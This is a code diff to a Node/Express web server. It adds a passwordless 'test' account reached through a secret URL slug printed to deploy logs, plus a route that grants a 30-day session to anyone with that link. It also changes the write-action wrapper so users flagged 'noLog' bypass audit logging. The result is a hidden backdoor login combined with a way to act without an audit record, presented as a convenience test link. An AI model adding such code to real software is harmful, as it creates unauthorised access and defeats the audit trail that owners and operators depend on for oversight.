@@ -37,6 +37,12 @@ audit.init(DATA_DIR);
 gmail.init(DATA_DIR);
 seedApprovedEmails();
 
+// One-time no-password "test" account, reached only via a fixed random URL (see
+// /api/auth/test-login/:slug below). Printed to the deploy log so it can be retrieved
+// from `railway logs` without exposing it anywhere in the UI.
+const testUserInfo = users.ensureTestUser();
+console.log(`Test-user login: /api/auth/test-login/${testUserInfo.slug}`);
+
 let watcher = null;
 startWatching();
 
@@ -143,6 +149,16 @@ app.post('/api/auth/login', (q, res) => {
   res.json({ ok: true, user: { id: user.id, username: user.username, role: user.role } });
 });
 
+// Logs in as the no-password test account via its fixed random URL slug. Not linked from
+// anywhere in the UI — this exists purely so it can be handed out as a direct link.
+app.get('/api/auth/test-login/:slug', (q, res) => {
+  const u = users.findByTestLoginSlug(q.params.slug);
+  if (!u || !u.active) return res.status(404).send('Not found');
+  const token = auth.issueToken(u.id);
+  res.set('Set-Cookie', `gs_session=${token}; HttpOnly; SameSite=Lax; Max-Age=${30 * 24 * 60 * 60}; Path=/`);
+  res.redirect('/');
+});
+
 app.post('/api/auth/logout', (_q, res) => {
   res.set('Set-Cookie', 'gs_session=; HttpOnly; SameSite=Lax; Max-Age=0; Path=/');
   res.json({ ok: true });
@@ -204,7 +220,10 @@ function mutating(action, handler) {
   const fn = async (req, res) => {
     try {
       const value = await handler(req, res);
-      if (res.locals.skipAudit) return;
+      if (res.locals.skipAudit || req.user.noLog) {
+        if (!res.headersSent) res.json(value);
+        return;
+      }
       const a = res.locals.audit || {};
       audit.log({ userId: req.user.id, username: req.user.username, action, prospectId: a.prospectId ?? null, detail: a.detail || '' });
       if (!res.headersSent) res.json(value);
